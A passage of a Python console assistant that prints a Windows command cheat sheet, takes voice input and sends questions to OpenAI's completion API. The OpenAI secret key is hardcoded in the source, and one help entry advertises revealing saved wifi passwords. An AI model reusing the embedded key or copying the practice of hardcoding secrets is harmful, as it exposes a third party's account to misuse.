                print('                                      telnet      = establish Telnet connection')
                print('format      = format volumes',end='')
                time.sleep(0.01)
                print('                                  ver         = display operating system version')
                print('ftp         = transfer files to a FTP server',end='')
                time.sleep(0.01)
                print('                  verify      = monitoring whether volumes are written correctly')
                print('fc          = copare files and display the differences',end='')
                time.sleep(0.01)
                print('        vol         = show volume description and serial numbers of the HDDs')
                print('ftype       = display file type and mapping',end='')
                time.sleep(0.01)
                print('                   w32tm       = setting time synchronisation/time server/time zone')
                print('for         = for loop',end='')
                time.sleep(0.01)
                print('                                        move        = move/rename files')
                print('gpresult    = display group policies',end='')
                time.sleep(0.01)
                print('                          mkdir       = create a new directory')
                print('getmac      = display MAC address',end='')
                time.sleep(0.01)
                print('                             netsh       = configure/control/display network components')
                print('gpupdate    = update group policies',end='')
                time.sleep(0.01)
                print('                           netstat     = display TCP/IP connections and status')
                print('hostname    = display host name',end='')
                time.sleep(0.01)
                print('                               nslookup    = query the DNS')
                print('ipconfig    = display IP network settings',end='')
                time.sleep(0.01)
                print('                     pathping    = test the connection to a specific IP address')
                print('label       = change volume name',end='')
                time.sleep(0.01)
                print('                              ping        = pings the network')
                print('mountvol    = assign/delete drive mountpoints',end='')
                time.sleep(0.01)
                print('                 perfmon     = start performance monitor')
                print('mode        = configure interfaces/devices',end='')
                time.sleep(0.01)
                print('                    prompt      = change command prompt')
                print('ncpa.cpl    = To open adapter properties',end='')
                time.sleep(0.01)
                print('                      network     = show all network adapters')
                print('nslookup    = for Dns Lookup & server IP check',end='')
                time.sleep(0.01)
                print('                wifi        = for checking wifi passwords')
                print('tracert     = tracing the IP and Ping of website ',end='')
                time.sleep(0.01)
                print('             arp /arp -a = it will show you the table ARP Poisioning')
                print(cya+'_______________________________________________________________________________________________________________________')
            else:
                if abhii_input=='hi':
                    listener=True

                    #-------------------------------------------------------------------------------
                    def main():
                        global abhii_input,listener,text24
                        recognizer = sr.Recognizer()

                        with sr.Microphone() as source:
                            print("Hey...ask me something")
                            try:
                                audio = recognizer.listen(source, timeout=3)
                                text24 = recognizer.recognize_google(audio)
                                print("You said:", text24)
                                abhii_input=text24
                                return text24
                                
                                
                            except sr.WaitTimeoutError:
                                print("Timeout: No speech detected.")
                            except sr.UnknownValueError:
                                print("Sorry, I couldn't understand your speech.")
                            except sr.RequestError as e:
                                print(f"Error requesting speech recognition: {e}")
                    abhii_input=main()
                    #-------------------------------------------------------------------------------
                try:
                    print('Let me think...\n\n')
                    os.environ["OPENAI_API_KEY"] = "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"
                    openai.api_key = os.getenv("OPENAI_API_KEY")
                    response = openai.Completion.create(
                        model="text-davinci-003",
                        prompt="Q:"+abhii_input+"\nA:",
                        temperature=1,
                        max_tokens=2000,
                        top_p=1,
                        frequency_penalty=0.0,
                        presence_penalty=0.0,
                        stop=["A:"]
                    )
                    alice_ai=response['choices'][0]['text']
                    empty_ans=alice_ai
                    empty_que=abhii_input
                    time.sleep(1)
                    #print('\n\n',variable_x)
                    text_lines=alice_ai.splitlines()
                    print(l_gre+'')
                    for variable1 in range(0,len(text_lines)):
                        print(text_lines[variable1])
                        time.sleep(0.05)
                    autosave()
                    if listener==True:
                        engine.say(alice_ai)
                        engine.runAndWait()
                        listener=False
                    print(blu+'\n_______________________________________________________________________________________________________________________')
                    print(cya+'````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````')
                    print(cya+'                                                                                                      \ANSWER-ENDS-HERE\\')
                except:
                    os.system('color 04')
                    print('Connection Failed!. check your internet connection and try again.')
                    time.sleep(1)
        


 











            

                








            


                    
                        


                            


                            
                            



                        
                        

                   



    


        
    
  
    
    


    
   


        

                    


        

                
                


                    

                        

                    

                    

                   


                
                



             
                    

                  
                    
                    
                    

                   
                   
                    
                 
                
                   
                
                
                   
                
                    



                


                





            


                        
 



          




            
            
            
            
            


            
        
                
                    
            


            

                
                

                

                    
                            
                                

                    
                    

                    
                




                   
                


                   


        
        
            
                
            
            
                
            
                
            
            
            
            
        
        
        
                    
                    
                
            
            
    




                    


            
                

            
                

                    
                
                    
                    

                

            

            

                
                
                

            

                

                

                

                

                

                

                

                

            

                

            

                

                

                

                            

                

                

            

            
                

                

                

                
                
                


                




                    
                    
                    





            
                

           

                
            



                    



                                    
                                
                                    
                                
                        
                                
                    

                        



            


                

                    

                        









                            








                

                                            








                










                
            
            
            
            


            
            


                



                
            
            
            
            








                

            
                
            
            
                
            
            

                
                
            
                
        
                
                
            
            
            
            
                
            
            
            
                
                
                
                
            
                
            
            
            
            
                
                
            
            
            
        
                
            
            
            
            
            
                
                
                
            
            
            
            
                
            
                
                
                
        
        
        
        
            
            
            
            
            
            
        
            
            
        
            
        
        
        
            
        
        
            
            
            
            




                
        
                
            
        
                
    

           
                
            

            

              
    

        


            





            
                    


            






            
                        
        






    


    
            
        

            








   


   
   

   







